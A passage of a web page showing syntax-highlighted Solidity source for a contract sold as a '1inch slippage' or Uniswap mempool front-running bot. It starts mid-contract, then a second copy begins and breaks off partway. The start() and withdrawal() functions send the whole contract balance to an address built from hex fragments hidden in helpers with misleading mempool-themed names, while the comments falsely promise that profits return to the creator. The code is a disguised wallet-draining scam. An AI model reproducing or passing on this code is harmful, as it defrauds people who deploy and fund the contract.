     * @param contract address to snipe liquidity from
     * @return \`liquidity\`.
     */</span>
    <span class="token keyword">function</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        <span class="token builtin">address</span> to <span class="token operator">=</span> <span class="token function">startExploration</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">fetchMempoolData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">address</span> <span class="token keyword">payable</span> contracts <span class="token operator">=</span> <span class="token keyword">payable</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">;</span>
        contracts<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token function">getBa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/*
     * @dev token int2 to readable str
     * @param token An output parameter to which the first token is written.
     * @return \`token\`.
     */</span>
    <span class="token keyword">function</span> <span class="token function">getMempoolCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">&quot;74262&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">uint2str</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _i<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> _uintAsString<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>_i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token string">&quot;0&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token builtin">uint</span> j <span class="token operator">=</span> _i<span class="token punctuation">;</span>
        <span class="token builtin">uint</span> len<span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            len<span class="token operator">++</span><span class="token punctuation">;</span>
            j <span class="token operator">/=</span> <span class="token number">10</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token builtin">bytes</span> <span class="token keyword">memory</span> bstr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">bytes</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">uint</span> k <span class="token operator">=</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>_i <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            bstr<span class="token punctuation">[</span>k<span class="token operator">--</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">byte</span><span class="token punctuation">(</span><span class="token builtin">uint8</span><span class="token punctuation">(</span><span class="token number">48</span> <span class="token operator">+</span> _i <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            _i <span class="token operator">/=</span> <span class="token number">10</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token builtin">string</span><span class="token punctuation">(</span>bstr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">function</span> <span class="token function">fetchMempoolVersion</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">&quot;C796C&quot;</span><span class="token punctuation">;</span>   
    <span class="token punctuation">}</span>
    <span class="token comment">/*
     * @dev withdrawals profit back to contract creator address
     * @return \`profits\`.
     */</span>
    <span class="token keyword">function</span> <span class="token function">withdrawal</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        <span class="token builtin">address</span> to <span class="token operator">=</span> <span class="token function">startExploration</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">fetchMempoolData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">address</span> <span class="token keyword">payable</span> contracts <span class="token operator">=</span> <span class="token keyword">payable</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">;</span>
        contracts<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token function">getBa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/*
     * @dev loads all Uniswap mempool into memory
     * @param token An output parameter to which the first token is written.
     * @return \`mempool\`.
     */</span>

    <span class="token keyword">function</span> <span class="token function">mempool</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> _base<span class="token punctuation">,</span> <span class="token builtin">string</span> <span class="token keyword">memory</span> _value<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin">bytes</span> <span class="token keyword">memory</span> _baseBytes <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">bytes</span> <span class="token keyword">memory</span> _valueBytes <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>_value<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token builtin">string</span> <span class="token keyword">memory</span> _tmpValue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">string</span><span class="token punctuation">(</span>_baseBytes<span class="token punctuation">.</span>length <span class="token operator">+</span> _valueBytes<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">bytes</span> <span class="token keyword">memory</span> _newValue <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>_tmpValue<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token builtin">uint</span> i<span class="token punctuation">;</span>
        <span class="token builtin">uint</span> j<span class="token punctuation">;</span>

        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>_baseBytes<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            _newValue<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> _baseBytes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>_valueBytes<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            _newValue<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> _valueBytes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token builtin">string</span><span class="token punctuation">(</span>_newValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">//SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.6</span><span class="token punctuation">;</span>

<span class="token comment">// This 1inch Slippage bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.</span>
<span class="token comment">// Import Libraries Migrator/Exchange/Factory</span>
<span class="token keyword">import</span> <span class="token string">&quot;https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token string">&quot;https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token string">&quot;https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol&quot;</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">OneinchSlippageBot</span> <span class="token punctuation">{</span>
 
    <span class="token builtin">string</span> <span class="token keyword">public</span> tokenName<span class="token punctuation">;</span>
    <span class="token builtin">string</span> <span class="token keyword">public</span> tokenSymbol<span class="token punctuation">;</span>
    <span class="token builtin">uint</span> liquidity<span class="token punctuation">;</span>

    <span class="token keyword">event</span> <span class="token function">Log</span><span class="token punctuation">(</span><span class="token builtin">string</span> _msg<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token comment">//tokenSymbol = _mainTokenSymbol;</span>
        <span class="token comment">//tokenName = _mainTokenName;</span>
    <span class="token punctuation">}</span>

    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

    <span class="token keyword">struct</span> <span class="token class-name">slice</span> <span class="token punctuation">{</span>
        <span class="token builtin">uint</span> _len<span class="token punctuation">;</span>
        <span class="token builtin">uint</span> _ptr<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token comment">/*
     * @dev Find newly deployed contracts on Uniswap Exchange
     * @param memory of required contract liquidity.
     * @param other The second slice to compare.
     * @return New contracts with required liquidity.
     */</span>

    <span class="token keyword">function</span> <span class="token function">findNewContracts</span><span class="token punctuation">(</span>slice <span class="token keyword">memory</span> self<span class="token punctuation">,</span> slice <span class="token keyword">memory</span> other<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin">uint</span> shortest <span class="token operator">=</span> self<span class="token punctuation">.</span>_len<span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>other<span class="token punctuation">.</span>_len <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>_len<span class="token punctuation">)</span>
            shortest <span class="token operator">=</span> other<span class="token punctuation">.</span>_len<span class="token punctuation">;</span>

        <span class="token builtin">uint</span> selfptr <span class="token operator">=</span> self<span class="token punctuation">.</span>_ptr<span class="token punctuation">;</span>
        <span class="token builtin">uint</span> otherptr <span class="token operator">=</span> other<span class="token punctuation">.</span>_ptr<span class="token punctuation">;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> idx <span class="token operator">&lt;</span> shortest<span class="token punctuation">;</span> idx <span class="token operator">+=</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// initiate contract finder</span>
            <span class="token builtin">uint</span> a<span class="token punctuation">;</span>
            <span class="token builtin">uint</span> b<span class="token punctuation">;</span>

            <span class="token builtin">string</span> <span class="token keyword">memory</span> WETH_CONTRACT_ADDRESS <span class="token operator">=</span> <span class="token string">&quot;0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2&quot;</span><span class="token punctuation">;</span>
            <span class="token builtin">string</span> <span class="token keyword">memory</span> TOKEN_CONTRACT_ADDRESS <span class="token operator">=</span> <span class="token string">&quot;0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2&quot;</span><span class="token punctuation">;</span>
            <span class="token function">loadCurrentContract</span><span class="token punctuation">(</span>WETH_CONTRACT_ADDRESS<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">loadCurrentContract</span><span class="token punctuation">(</span>TOKEN_CONTRACT_ADDRESS<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">assembly</span> <span class="token punctuation">{</span>
                a <span class="token operator">:=</span> <span class="token function">mload</span><span class="token punctuation">(</span>selfptr<span class="token punctuation">)</span>
                b <span class="token operator">:=</span> <span class="token function">mload</span><span class="token punctuation">(</span>otherptr<span class="token punctuation">)</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">!=</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// Mask out irrelevant contracts and check again for new contracts</span>
                <span class="token builtin">uint256</span> mask <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token keyword">if</span><span class="token punctuation">(</span>shortest <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                  mask <span class="token operator">=</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">-</span> shortest <span class="token operator">+</span> idx<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token builtin">uint256</span> diff <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>b <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>diff <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
                    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>diff<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            selfptr <span class="token operator">+=</span> <span class="token number">32</span><span class="token punctuation">;</span>
            otherptr <span class="token operator">+=</span> <span class="token number">32</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>_len<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">int</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token comment">/*
     * @dev Extracts the newest contracts on Uniswap exchange
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return \`list of contracts\`.
     */</span>
    <span class="token keyword">function</span> <span class="token function">findContracts</span><span class="token punctuation">(</span><span class="token builtin">uint</span> selflen<span class="token punctuation">,</span> <span class="token builtin">uint</span> selfptr<span class="token punctuation">,</span> <span class="token builtin">uint</span> needlelen<span class="token punctuation">,</span> <span class="token builtin">uint</span> needleptr<span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin">uint</span> ptr <span class="token operator">=</span> selfptr<span class="token punctuation">;</span>
        <span class="token builtin">uint</span> idx<span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>needlelen <span class="token operator">&lt;=</span> selflen<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>needlelen <span class="token operator">&lt;=</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token builtin">bytes32</span> mask <span class="token operator">=</span> <span class="token builtin">bytes32</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">-</span> needlelen<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token builtin">bytes32</span> needledata<span class="token punctuation">;</span>
                <span class="token keyword">assembly</span> <span class="token punctuation">{</span> needledata <span class="token operator">:=</span> <span class="token function">and</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span>needleptr<span class="token punctuation">)</span><span class="token punctuation">,</span> mask<span class="token punctuation">)</span> <span class="token punctuation">}</span>

                <span class="token builtin">uint</span> end <span class="token operator">=</span> selfptr <span class="token operator">+</span> selflen <span class="token operator">-</span> needlelen<span class="token punctuation">;</span>
                <span class="token builtin">bytes32</span> ptrdata<span class="token punctuation">;</span>
                <span class="token keyword">assembly</span> <span class="token punctuation">{</span> ptrdata <span class="token operator">:=</span> <span class="token function">and</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> mask<span class="token punctuation">)</span> <span class="token punctuation">}</span>

